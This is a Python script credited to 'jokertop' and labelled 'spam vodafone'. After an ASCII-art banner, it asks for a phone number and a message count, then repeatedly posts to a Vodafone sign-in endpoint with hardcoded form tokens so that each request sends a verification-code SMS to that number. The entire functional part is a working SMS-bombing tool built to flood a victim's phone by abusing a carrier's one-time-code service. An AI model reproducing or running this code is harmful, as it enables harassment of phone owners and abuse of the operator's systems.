# StyleGame_Script
import requests, sys, os, time
print('\x1b[0;31m')
logo = '\t                        \t\n     .... NO! ...                  ... MNO! ...\n   ..... MNO!! ...................... MNNOO! ...\n ..... MMNO! ......................... MNNOO!! .\n..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .\n ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....\n    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...\n   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....\n   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...\n    ....... MMMMM..    OPPMMP    .,OMI! ....\n     ...... MMMM::   o.,OPMP,.o   ::I!! ...\n         .... NNM:::.,,OOPM!P,.::::!! ....\n          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....\n         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....\n           .. MMMMMNNOOMMNNIIIPPPOO!! ......\n          ...... MMMONNMMNNNIIIOO!..........\n       ....... MN MOMMMNNNIIIIIO! OO ..........\n    ......... MNO! IiiiiiiiiiiiI OOOO ...........\n  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........\n   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........\n   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........\n      ...... OO! ................. ON! .......\n         ................................                               \n          {by jokertop}\n          {spam vodafone new}\n'
log2 = '\n<=======================================>\n\x1b[0;31m{UI STYLE}\x1b[1;37m>>\x1b[0;31m{BYJOKERTOP}\x1b[1;37m>>\x1b[0;31m{SPAM VODAFONE}\n\x1b[0;31m<=======================================>'
print()
print(logo)
for w in log2:
    sys.stdout.write(w)
    sys.stdout.flush()
    time.sleep(0.1)
else:
    print()
    print('\x1b[0;33m(Info)')
    print('\x1b[0;36m---------------------------')
    number = input('Enter Your Number:')
    print('\x1b[0;36m---------------------------')
    trys = input('Enter num Sms:')
    print('\x1b[0;36m---------------------------')
    print()
    r = requests.Session()
    hd = {'Host':'www2.vf-live.com',  'Connection':'keep-alive', 
     'Content-Type':'application/x-www-form-urlencoded', 
     'User-Agent':'Mozilla/5.0 (Linux; Android 8.1.0; DRA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36'}
    url = 'http://www2.vf-live.com/vfChallenge/signin'
    data = {'__VIEWSTATE':'Qr5p0mLF8BLmKwGa+yQB8ul8UptXbgAQZxoy5o5mmhSgQOnaaxibtrD+lIjtMteVoszAzuzDfKC2KUSYiqOhKH6nd96bk97vffKjDyKfSUUmbEdB+6PReLOUcpbhmFAw9/XginCsrHwI2CfDTLPx8lhAqH+9odL9jWpJM0+ctXxfoClN9I1ybXI0OwAQPRpzHxuonAYdrd44ySpgz06gIm+1ZSG0nq1hNZMJtEFs6bYIVwAQx6QfbPOi+B4qMpZZwyE/SHKYIUUK9QAUiP9EMbo/fvl5ZxsG6vV238YCvpQfnDiGyDtfIKmYdrceXsvQOlCvB3ammzHQOhb+LUs2/g+UG7Cw3Pl1dkTUgQ3eVyDes6J0B63/w8bX8aC6laHwOGnkau1mveLcQncJf2sTY+zeHlSa+dOdX8UuH2QZy4Q2EqQOqwJgCMY7tFCEK0XjkMtSLCQ17zFM98uGoAo+1Q==',  '__VIEWSTATEGENERATOR':'74898964', 
     '__VIEWSTATEENCRYPTED':'', 
     '__EVENTVALIDATION':'TF90lB323ijDdP35LTcJfNl5x3FUAb4JnfCFjmBBPWbs3lW/zTYWFiV7PT+pLBdjiuKn5B0835Ef1o7bTOP9m9x46luMPXXBoyQ9+wJ7fRz+U7WgsKQcahlbOitre8YjA3Zx763zyao+398KupY+Ag==', 
     'ctl00$MainPlaceHolder$txtMSISDN':number, 
     'ctl00$MainPlaceHolder$btnSignIn':'ابعت+الكود'}
    for i in range(int(trys)):
        r = requests.post(url, headers=hd, data=data).text
        if 'validateVerificationPinCode' in r:
            print('\x1b[0;36mDone sent sms')
        else:
            print('\x1b[0;31mNumber error')
